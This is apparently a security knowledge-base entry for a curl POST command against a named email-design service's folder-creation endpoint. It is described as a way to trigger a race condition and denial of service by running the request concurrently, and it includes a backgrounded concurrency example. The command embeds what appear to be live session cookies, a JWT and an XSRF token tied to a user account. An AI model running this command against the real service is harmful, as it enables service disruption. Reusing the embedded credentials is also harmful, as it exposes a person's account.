---
data: >-
  curl -X POST
  https://my.stripo.email/cabinet/stripeapi/v1/projects/298427/emails/folders -H
  "Host: my.stripo.email" -H "Connection: close" -H "Content-Length: 23" -H
  "Accept: application/json, text/plain, */*" -H "Content-Type:
  application/json;charset=UTF-8" -H "X-XSRF-TOKEN:
  704b458b-c5bd-4ff1-9610-da193b987cb7" -H "Cookie:
  token=eyJhbGciOiJSUzUxMiJ9.eyJhdXRoX3Rva2VuIjoie1widXNlckluZm9cIjp7XCJpZFwiOjI5NDA3NyxcImVtYWlsXCI6XCJqYWFhaGJvdW50eUBnbWFpbC5jb21cIixcImxvY2FsZUtleVwiOlwicHRcIixcImZpcnN0TmFtZVwiOlwiYm91bnR5MVwiLFwibGFzdE5hbWVcIjpcImJvdW50eVwiLFwiZmFjZWJvb2tJZFwiOm51bGwsXCJuYW1lXCI6bnVsbCxcInBob25lc1wiOltdLFwiYWN0aXZlXCI6dHJ1ZSxcImd1aWRcIjpudWxsLFwiYWN0aXZlUHJvamVjdElkXCI6Mjk4NDI3LFwic3VwZXJVc2VyVjJcIjpmYWxzZSxcImdhSWRcIjpcImNiZTljMzIyLTAzYTUtNDc0MS05ZDI2LTU3NzE3NTBiNDNjMFwiLFwib3JnYW5pemF0aW9uSWRcIjoyOTM4MTQsXCJvd25lZFByb2plY3RzXCI6WzI5ODQyN10sXCJmdWxsTmFtZVwiOlwiYm91bnR5MSBib3VudHlcIn0sXCJpc3N1ZWRBdFwiOjE2MDEzODQxNTY3NDEsXCJhcGlLZXlcIjpudWxsLFwicHJvamVjdElkXCI6bnVsbCxcInhzcmZUb2tlblwiOlwiNzA0YjQ1OGItYzViZC00ZmYxLTk2MTAtZGExOTNiOTg3Y2I3XCIsXCJyb2xlXCI6XCJDQUJJTkVUX1VTRVJcIixcImF1dGhvcml0aWVzXCI6W119IiwiZXhwIjoxNjAxNDcwNTU2fQ.v5AkWczH5NwzUvTNhKEYYLhBoL3If9GCb-TkJcCrY_UJN0zFOP0_R7inBRFfwwikVj0GDgTu5YrXCOsy4tge1ug-vemWzEKN5fCC_1qBjN3bWNMKwaL_73VDXvWaFFJGH7o78L5AJI5561bYPTTKFUoq1pn0WooP2K-mepsKblh9SHcN8_VuKjlXx7LbqqrrA9JWSvFOYJgIGfNODr4NfkMBvMrfVxTmPm1CsAvBNKC4sAc02xbuOmWDx0Pvw23RhQHUAHNNPwGKIYYBPsHaqcSQBVtxqs-mtIT0gzVeBUmPXK9t3E82m_aAUBYEEXYwnVdb9lsVPytrYC3wMj-cva-BZLcfC_Lji9NqcVH9LeQXof3JCTtsKnqSSn3rxAdQeGqPIo9Pc-3y1oXJAgGGGMXmZ2DiYIQ24EQUrNwManvWlLLS4OGaKX5XIC5WvT0N-iwaeDcCw-2OCS5sElK1hN0CbhJ4u7i8k_6tK6rFFRWP2OVqayC55dhCeaCmdgwYqAnfc7cJ44kmeYhP-9Jg2h8tHEYnV172llmGQE2UrYlMy3x1FT3yKyU-knWMFrUSI6kXG-oc_ScPJV9JDaSOsBjdXoHfG8MyuH6R6JxEC7qAo4fm6UV25MQIzMXLNZmhbR-RvKIRK-o9l9wDsT4-PxpTmUB8_LVU8Mji9qm5NXQ;
  JSESSIONID=81E11E33CF9ABA02A4AB3D68A29BC4F8" -d '{"name":"Nova Pasta 2"}'
tags:
  - api
  - post
  - dos
type: command
output: 'null'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:18.738Z'
id: f6feb9dd-5636-4b23-8b28-3a81df9c5b9c
verified: false
validated: true
submitted: true
---
# post-create-folder

## Command

```bash
curl -X POST https://my.stripo.email/cabinet/stripeapi/v1/projects/298427/emails/folders -H "Host: my.stripo.email" -H "Connection: close" -H "Content-Length: 23" -H "Accept: application/json, text/plain, */*" -H "Content-Type: application/json;charset=UTF-8" -H "X-XSRF-TOKEN: 704b458b-c5bd-4ff1-9610-da193b987cb7" -H "Cookie: token=eyJhbGciOiJSUzUxMiJ9...; JSESSIONID=81E11E33CF9ABA02A4AB3D68A29BC4F8" -d '{"name":"Nova Pasta 2"}'
```

## Description

This command sends a POST request to create a new folder in the Stripo Email API. It is used to test and exploit the folder creation endpoint, particularly when repeated concurrently to trigger a race condition leading to DoS. Requires valid authentication tokens.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `https://my.stripo.email/cabinet/stripeapi/v1/projects/298427/emails/folders` | Target endpoint URL with project ID | Yes |
| `-H "Content-Type: application/json;charset=UTF-8"` | Sets JSON payload format | Yes |
| `-H "X-XSRF-TOKEN: ..."` | CSRF protection token | Yes |
| `-H "Cookie: token=...; JSESSIONID=..."` | Authentication cookies | Yes |
| `-d '{"name":"Nova Pasta 2"}'` | JSON payload with folder name | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://my.stripo.email/cabinet/stripeapi/v1/projects/298427/emails/folders -H "Content-Type: application/json" -H "X-XSRF-TOKEN: token_here" -H "Cookie: token=auth_token" -d '{"name":"Test Folder"}'
```

### Advanced Usage

```bash
# For concurrency in script
curl -X POST ... -d '{"name":"Folder $(date +%s)"}' &
```

## Expected Output

Successful execution returns a JSON response like {"id":123, "name":"Nova Pasta 2", "created_at":"timestamp"}, with HTTP 200/201 status. In DoS scenarios, subsequent requests may fail with 500 errors or timeouts.

## Related

- [[Related Procedure|procedures/Exploit-Race-Condition-in-Folder-Creation]]
